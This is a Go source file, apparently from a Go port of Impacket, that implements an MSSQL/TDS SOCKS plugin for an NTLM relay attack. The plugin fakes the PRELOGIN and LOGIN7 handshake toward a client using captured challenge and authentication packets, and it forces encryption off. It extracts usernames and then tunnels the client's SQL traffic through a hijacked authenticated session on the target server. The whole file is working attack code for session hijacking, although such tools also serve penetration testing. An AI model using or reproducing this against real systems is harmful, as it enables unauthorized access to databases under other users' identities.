// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"strings"

	"gopacket/internal/build"
)

// TDS packet type constants
const (
	tdsPreLogin = 18
	tdsLogin7   = 16
	tdsSSPI     = 17
)

// TDS status constants
const (
	tdsStatusNormal = 0
	tdsStatusEOM    = 1
)

// TDS encryption constants
const (
	tdsEncryptNotSup = 2
)

// MSSQLSocksPlugin implements the SOCKS plugin for MSSQL/TDS protocol.
// Fakes TDS PRELOGIN and LOGIN7 authentication with the SOCKS client
// using stored TDS challenge/auth packets from the relay handshake.
// Matches Impacket's socksplugins/mssql.py.
type MSSQLSocksPlugin struct{}

func (p *MSSQLSocksPlugin) InitConnection(clientConn net.Conn) error {
	return nil
}

func (p *MSSQLSocksPlugin) SkipAuthentication(clientConn net.Conn, sd *SessionData, lookupRelay func(string) *ActiveRelay) (string, error) {
	if sd == nil {
		return "", fmt.Errorf("no session data available")
	}

	// Step 1: Receive TDS PRELOGIN from client
	pkt, err := socksTDSRecv(clientConn)
	if err != nil {
		return "", fmt.Errorf("recv PRELOGIN: %v", err)
	}
	if pkt.Type != tdsPreLogin {
		return "", fmt.Errorf("expected PRELOGIN (type %d), got type %d", tdsPreLogin, pkt.Type)
	}

	if build.Debug {
		log.Printf("[D] SOCKS MSSQL: received PRELOGIN (%d bytes)", len(pkt.Data))
	}

	// Reply with fabricated PRELOGIN response saying encryption not supported
	preloginResp := buildPreLoginResponse()
	if err := socksTDSSend(clientConn, tdsPreLogin+1, preloginResp); err != nil {
		return "", fmt.Errorf("send PRELOGIN response: %v", err)
	}

	// Step 2: Receive TDS LOGIN7 from client
	pkt, err = socksTDSRecv(clientConn)
	if err != nil {
		return "", fmt.Errorf("recv LOGIN7: %v", err)
	}
	if pkt.Type != tdsLogin7 {
		return "", fmt.Errorf("expected LOGIN7 (type %d), got type %d", tdsLogin7, pkt.Type)
	}

	if build.Debug {
		log.Printf("[D] SOCKS MSSQL: received LOGIN7 (%d bytes)", len(pkt.Data))
	}

	// Check if this is integrated security (NTLM) by looking at OptionFlags2
	// LOGIN7 body layout: Length(4) + TDSVersion(4) + PacketSize(4) + ClientProgVer(4)
	//   + ClientPID(4) + ConnectionID(4) + OptionFlags1(1) + OptionFlags2(1) = offset 25
	isIntegrated := false
	if len(pkt.Data) >= 26 {
		optFlags2 := pkt.Data[25]
		isIntegrated = optFlags2&0x80 != 0 // TDS_INTEGRATED_SECURITY_ON
	}

	var username string

	if isIntegrated {
		// Windows Authentication (NTLM)
		if len(sd.MSSQLChallengeTDS) == 0 {
			return "", fmt.Errorf("no MSSQL challenge TDS data available for integrated auth")
		}

		// Send stored NTLM challenge TDS packet
		if _, err := clientConn.Write(sd.MSSQLChallengeTDS); err != nil {
			return "", fmt.Errorf("send NTLM challenge: %v", err)
		}

		if build.Debug {
			log.Printf("[D] SOCKS MSSQL: sent stored NTLM challenge (%d bytes)", len(sd.MSSQLChallengeTDS))
		}

		// Receive SSPI Type3 from client
		pkt, err = socksTDSRecv(clientConn)
		if err != nil {
			return "", fmt.Errorf("recv SSPI Type3: %v", err)
		}

		// Extract username from NTLM Type3
		domain, user := extractNTLMType3Info(pkt.Data)
		username = fmt.Sprintf("%s\\%s", strings.ToUpper(domain), strings.ToUpper(user))
	} else {
		// SQL Authentication — extract username from LOGIN7
		user := extractLogin7Username(pkt.Data)
		if strings.Contains(user, "/") || strings.Contains(user, "\\") {
			username = strings.ToUpper(user)
		} else {
			username = "\\" + strings.ToUpper(user) // Empty domain
		}
	}

	if build.Debug {
		log.Printf("[D] SOCKS MSSQL: client authenticated as %s", username)
	}

	// Look up relay for this username
	relay := lookupRelay(username)
	if relay == nil {
		// Try NetBIOS domain
		parts := strings.SplitN(username, "\\", 2)
		if len(parts) == 2 {
			domain := parts[0]
			user := parts[1]
			if idx := strings.Index(domain, "."); idx > 0 {
				netbios := strings.ToUpper(domain[:idx])
				altUsername := fmt.Sprintf("%s\\%s", netbios, user)
				relay = lookupRelay(altUsername)
				if relay != nil {
					username = altUsername
				}
			}
		}
	}

	if relay == nil {
		return "", fmt.Errorf("no relay found for user %s", username)
	}

	// Check if relay is already in use
	relay.mu.Lock()
	if relay.InUse {
		relay.mu.Unlock()
		return "", fmt.Errorf("relay for %s is already in use", username)
	}
	relay.mu.Unlock()

	// Send stored auth answer (LOGIN_ACK)
	if len(sd.MSSQLAuthAnswer) == 0 {
		return "", fmt.Errorf("no MSSQL auth answer data available")
	}
	if _, err := clientConn.Write(sd.MSSQLAuthAnswer); err != nil {
		return "", fmt.Errorf("send auth answer: %v", err)
	}

	log.Printf("[+] SOCKS MSSQL: authenticated %s — routing through relay", username)

	return username, nil
}

func (p *MSSQLSocksPlugin) TunnelConnection(clientConn net.Conn, relay *ActiveRelay) error {
	mssqlClient, ok := relay.Client.(*MSSQLRelayClient)
	if !ok || mssqlClient.tdsClient == nil {
		return fmt.Errorf("MSSQL relay client has no TDS session")
	}

	tdsClient := mssqlClient.tdsClient

	for {
		// Read TDS packet from SOCKS client
		pkt, err := socksTDSRecv(clientConn)
		if err != nil {
			return fmt.Errorf("recv from client: %v", err)
		}

		// Forward to target via the TDS client
		if err := tdsClient.SendTDS(pkt.Type, pkt.Data); err != nil {
			return fmt.Errorf("send to target: %v", err)
		}

		// Read response from target
		resp, err := tdsClient.RecvTDS()
		if err != nil {
			return fmt.Errorf("recv from target: %v", err)
		}

		// Forward response to SOCKS client
		if err := socksTDSSendRaw(clientConn, resp.Marshal()); err != nil {
			return fmt.Errorf("send to client: %v", err)
		}
	}
}

// socksTDSRecv reads a complete TDS packet (with multi-packet reassembly) from a connection.
func socksTDSRecv(conn net.Conn) (*tdsSocksPacket, error) {
	// Read 8-byte TDS header
	header := make([]byte, 8)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}

	pkt := &tdsSocksPacket{
		Type:   header[0],
		Status: header[1],
	}
	length := binary.BigEndian.Uint16(header[2:4])

	// Read data
	if length > 8 {
		pkt.Data = make([]byte, length-8)
		if _, err := io.ReadFull(conn, pkt.Data); err != nil {
			return nil, err
		}
	}

	// Continue reading if not EOM
	for pkt.Status&tdsStatusEOM == 0 {
		if _, err := io.ReadFull(conn, header); err != nil {
			return nil, err
		}
		tmpLength := binary.BigEndian.Uint16(header[2:4])
		pkt.Status = header[1]

		if tmpLength > 8 {
			tmpData := make([]byte, tmpLength-8)
			if _, err := io.ReadFull(conn, tmpData); err != nil {
				return nil, err
			}
			pkt.Data = append(pkt.Data, tmpData...)
		}
	}

	return pkt, nil
}

// socksTDSSend sends a TDS packet with proper framing.
func socksTDSSend(conn net.Conn, packetType uint8, data []byte) error {
	const maxPacketSize = 32763

	packetID := uint8(1)

	for len(data) > maxPacketSize-8 {
		pkt := make([]byte, maxPacketSize)
		pkt[0] = packetType
		pkt[1] = tdsStatusNormal
		binary.BigEndian.PutUint16(pkt[2:4], uint16(maxPacketSize))
		pkt[6] = packetID
		copy(pkt[8:], data[:maxPacketSize-8])
		if _, err := conn.Write(pkt); err != nil {
			return err
		}
		data = data[maxPacketSize-8:]
		packetID++
	}

	// Final packet
	length := 8 + len(data)
	pkt := make([]byte, length)
	pkt[0] = packetType
	pkt[1] = tdsStatusEOM
	binary.BigEndian.PutUint16(pkt[2:4], uint16(length))
	pkt[6] = packetID
	copy(pkt[8:], data)
	_, err := conn.Write(pkt)
	return err
}

// socksTDSSendRaw sends raw pre-formed TDS bytes to a connection.
func socksTDSSendRaw(conn net.Conn, data []byte) error {
	_, err := conn.Write(data)
	return err
}

// tdsSocksPacket is a simplified TDS packet for SOCKS plugin use.
type tdsSocksPacket struct {
	Type   uint8
	Status uint8
	Data   []byte
}

// buildPreLoginResponse builds a TDS PRELOGIN response with ENCRYPT_NOT_SUP.
func buildPreLoginResponse() []byte {
	// PRELOGIN tokens:
	// Token 0x00 (VERSION): offset, length → version bytes
	// Token 0x01 (ENCRYPTION): offset, length → encryption byte
	// Token 0x02 (INSTOPT): offset, length → instance name
	// Token 0x03 (THREADID): offset, length → thread ID
	// Token 0xFF: terminator

	// Calculate offsets (each token option is 5 bytes: type(1) + offset(2) + length(2))
	// 4 tokens × 5 bytes + 1 terminator = 21 bytes of option headers
	headerSize := 21
	versionData := []byte{0x08, 0x00, 0x01, 0x55, 0x00, 0x00} // Version 8.0.1.85
	encryptData := []byte{tdsEncryptNotSup}
	instanceData := []byte{0x00} // Empty instance name
	threadIDData := make([]byte, 4)
	binary.BigEndian.PutUint32(threadIDData, uint32(rand.Intn(65535)))

	offset := headerSize
	result := make([]byte, 0, headerSize+len(versionData)+len(encryptData)+len(instanceData)+len(threadIDData))

	// VERSION token
	result = append(result, 0x00)
	result = append(result, byte(offset>>8), byte(offset))
	result = append(result, byte(len(versionData)>>8), byte(len(versionData)))
	offset += len(versionData)

	// ENCRYPTION token
	result = append(result, 0x01)
	result = append(result, byte(offset>>8), byte(offset))
	result = append(result, byte(len(encryptData)>>8), byte(len(encryptData)))
	offset += len(encryptData)

	// INSTOPT token
	result = append(result, 0x02)
	result = append(result, byte(offset>>8), byte(offset))
	result = append(result, byte(len(instanceData)>>8), byte(len(instanceData)))
	offset += len(instanceData)

	// THREADID token
	result = append(result, 0x03)
	result = append(result, byte(offset>>8), byte(offset))
	result = append(result, byte(len(threadIDData)>>8), byte(len(threadIDData)))

	// Terminator
	result = append(result, 0xFF)

	// Append data
	result = append(result, versionData...)
	result = append(result, encryptData...)
	result = append(result, instanceData...)
	result = append(result, threadIDData...)

	return result
}

// extractLogin7Username extracts the username from a TDS LOGIN7 packet.
func extractLogin7Username(data []byte) string {
	// LOGIN7 fixed header: Length(4) + TDSVersion(4) + PacketSize(4) + ClientProgVer(4)
	//   + ClientPID(4) + ConnectionID(4) + Flags(4) + ClientTimZone(4) + ClientLCID(4) = 36 bytes
	// Variable-length pointers at offset 36: ibHostName(2)+cchHostName(2) = offset 36
	// ibUserName(2)+cchUserName(2) = offset 40
	if len(data) < 44 {
		return ""
	}

	// Username offset and length (relative to start of LOGIN7 body)
	userOffset := binary.LittleEndian.Uint16(data[40:42])
	userLength := binary.LittleEndian.Uint16(data[42:44])

	if userLength == 0 {
		return ""
	}

	start := int(userOffset)
	end := start + int(userLength)*2 // UTF-16LE, 2 bytes per char
	if end > len(data) {
		return ""
	}

	return decodeUTF16LE(data[start:end])
}
